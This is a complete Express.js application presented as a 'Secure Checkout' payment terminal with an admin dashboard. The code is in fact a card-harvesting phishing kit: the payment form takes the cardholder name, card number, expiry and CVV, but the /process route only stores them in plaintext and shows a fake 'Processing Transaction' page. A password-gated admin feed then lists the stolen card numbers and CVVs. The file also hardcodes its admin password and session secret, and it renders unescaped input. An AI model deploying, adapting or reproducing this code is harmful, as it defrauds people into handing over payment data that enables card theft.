/* 
  FULL APPLICATION: Payment Terminal + Admin Dashboard
  PASSWORD: ricoburac7
*/

const express = require('express');
const session = require('express-session');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: 'super-secret-key',
    resave: false,
    saveUninitialized: true
}));

let database = [];

// --- THE WEBSITE PAGES ---

// 1. CUSTOMER PAYMENT PAGE
const paymentPage = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Checkout</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-50 flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md border border-gray-100">
        <h2 class="text-2xl font-bold text-gray-800 mb-2">Secure Payment</h2>
        <p class="text-gray-500 mb-8 text-sm">Enter your card details to complete the order.</p>
        
        <form action="/process" method="POST" class="space-y-4">
            <div>
                <label class="block text-xs font-semibold text-gray-500 uppercase">Cardholder Name</label>
                <input type="text" name="name" required class="w-full mt-1 p-3 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
            </div>
            <div>
                <label class="block text-xs font-semibold text-gray-500 uppercase">Card Number</label>
                <input type="text" name="card" placeholder="0000 0000 0000 0000" required class="w-full mt-1 p-3 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
            </div>
            <div class="flex gap-4">
                <div class="flex-1">
                    <label class="block text-xs font-semibold text-gray-500 uppercase">Expiry (MM/YY)</label>
                    <input type="text" name="exp" placeholder="MM/YY" required class="w-full mt-1 p-3 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
                </div>
                <div class="flex-1">
                    <label class="block text-xs font-semibold text-gray-500 uppercase">CVV</label>
                    <input type="text" name="cvv" placeholder="123" required class="w-full mt-1 p-3 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
                </div>
            </div>
            <button class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-lg shadow-lg shadow-blue-200 transition-all mt-4">
                Pay Now
            </button>
        </form>
    </div>
</body>
</html>`;

// 2. ADMIN VIEW PAGE
const adminPage = (data) => `
<!DOCTYPE html>
<html>
<head>
    <title>Admin Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-white p-8 font-mono">
    <div class="max-w-5xl mx-auto">
        <div class="flex justify-between items-center mb-8">
            <h1 class="text-2xl font-bold text-green-400 font-bold underline">LIVE TRANSACTION FEED</h1>
            <a href="/logout" class="bg-red-500 text-white px-4 py-2 rounded text-xs">LOGOUT</a>
        </div>
        <div class="overflow-hidden rounded-lg border border-gray-700">
            <table class="w-full text-left">
                <thead class="bg-gray-800 text-gray-400">
                    <tr>
                        <th class="p-4">Time</th>
                        <th class="p-4">Customer</th>
                        <th class="p-4 text-yellow-500">Card Number</th>
                        <th class="p-4">EXP</th>
                        <th class="p-4 text-red-400">CVV</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-gray-800">
                    ${data.map(i => `
                        <tr class="hover:bg-gray-800">
                            <td class="p-4 text-gray-500 text-xs">${i.time}</td>
                            <td class="p-4 font-bold">${i.name}</td>
                            <td class="p-4 font-bold text-yellow-500">${i.card}</td>
                            <td class="p-4">${i.exp}</td>
                            <td class="p-4 font-bold text-red-500">${i.cvv}</td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>`;

// --- ROUTES ---

app.get('/', (req, res) => res.send(paymentPage));

app.post('/process', (req, res) => {
    database.unshift({ ...req.body, time: new Date().toLocaleTimeString() });
    res.send("<body style='font-family:sans-serif; text-align:center; padding-top:100px;'><h2>Processing Transaction...</h2><p>Do not close this window.</p></body>");
});

app.get('/login', (req, res) => {
    res.send('<body style="display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; background:#111827;">' +
             '<form action="/login" method="POST" style="background:white; padding:40px; border-radius:10px;">' +
             '<h3>Admin Password:</h3><input type="password" name="pw" style="border:1px solid #ccc; padding:10px; width:100%;"><br><button style="width:100%; margin-top:20px; padding:10px; background:blue; color:white; border:none; cursor:pointer;">Enter</button></form></body>');
});

app.post('/login', (req, res) => {
    if (req.body.pw === 'ricoburac7') {
        req.session.auth = true;
        res.redirect('/admin');
    } else {
        res.send('Wrong password.');
    }
});

app.get('/admin', (req, res) => {
    if (!req.session.auth) return res.redirect('/login');
    res.send(adminPage(database));
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login');
});

app.listen(PORT, () => console.log(`Server started on port ${PORT}`));